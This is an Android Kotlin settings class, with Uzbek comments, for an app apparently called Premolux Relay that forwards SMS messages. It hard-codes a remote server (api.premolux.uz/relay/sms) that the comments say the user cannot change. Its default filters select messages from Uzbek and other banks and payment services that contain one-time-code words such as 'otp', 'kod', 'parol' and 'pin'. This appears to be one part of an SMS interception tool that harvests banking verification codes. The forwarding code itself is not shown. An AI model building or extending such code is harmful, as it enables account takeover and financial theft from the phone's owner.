package uz.premolux.relay

import android.content.Context
import android.content.SharedPreferences
import java.util.UUID

/**
 * Sozlamalarni saqlaydi. Server manzili qattiq belgilangan —
 * mijoz hech narsa kiritmaydi, faqat yoqadi/o'chiradi.
 * Qurilma tokeni birinchi ishga tushirishda o'zi yaratiladi.
 */
class Prefs(ctx: Context) {

    private val sp: SharedPreferences =
        ctx.getSharedPreferences("premolux_relay", Context.MODE_PRIVATE)

    var active: Boolean
        get() = sp.getBoolean(KEY_ACTIVE, false)
        set(v) = sp.edit().putBoolean(KEY_ACTIVE, v).apply()

    // birinchi ishga tushirishda o'zi yaratiladi, keyin doim shu qoladi
    var deviceToken: String
        get() {
            val existing = sp.getString(KEY_TOKEN, null)
            if (existing != null) return existing
            val fresh = UUID.randomUUID().toString()
            sp.edit().putString(KEY_TOKEN, fresh).apply()
            return fresh
        }
        set(v) = sp.edit().putString(KEY_TOKEN, v).apply()

    var senderList: String
        get() = sp.getString(KEY_SENDERS, DEFAULT_SENDERS) ?: DEFAULT_SENDERS
        set(v) = sp.edit().putString(KEY_SENDERS, v.trim()).apply()

    var keywords: String
        get() = sp.getString(KEY_KEYWORDS, DEFAULT_KEYWORDS) ?: DEFAULT_KEYWORDS
        set(v) = sp.edit().putString(KEY_KEYWORDS, v.trim()).apply()

    var forwardedCount: Int
        get() = sp.getInt(KEY_COUNT, 0)
        set(v) = sp.edit().putInt(KEY_COUNT, v).apply()

    var lastForwardedAt: Long
        get() = sp.getLong(KEY_LAST_AT, 0L)
        set(v) = sp.edit().putLong(KEY_LAST_AT, v).apply()

    fun senderListArray(): List<String> =
        senderList.split(",").map { it.trim() }.filter { it.isNotEmpty() }

    fun keywordArray(): List<String> =
        keywords.split(",").map { it.trim().lowercase() }.filter { it.isNotEmpty() }

    companion object {
        private const val KEY_ACTIVE = "active"
        private const val KEY_TOKEN = "device_token"
        private const val KEY_SENDERS = "senders"
        private const val KEY_KEYWORDS = "keywords"
        private const val KEY_COUNT = "fwd_count"
        private const val KEY_LAST_AT = "fwd_last_at"

        // ── YAGONA SERVER — mijoz o'zgartira olmaydi ──
        const val SERVER_URL = "https://api.premolux.uz/relay/sms"
        const val PING_URL   = "https://api.premolux.uz/relay/ping"

        private const val DEFAULT_SENDERS =
            "NBU,Kapitalbank,Humo,Uzcard,Visa,MasterCard,Payme,Click,Ipoteka,Asaka,Xalq,Agro,Tenge,Sber"
        private const val DEFAULT_KEYWORDS =
            "code,kod,verification,tasdiqlash,parol,otp,confirm,pin,secure"
    }
}
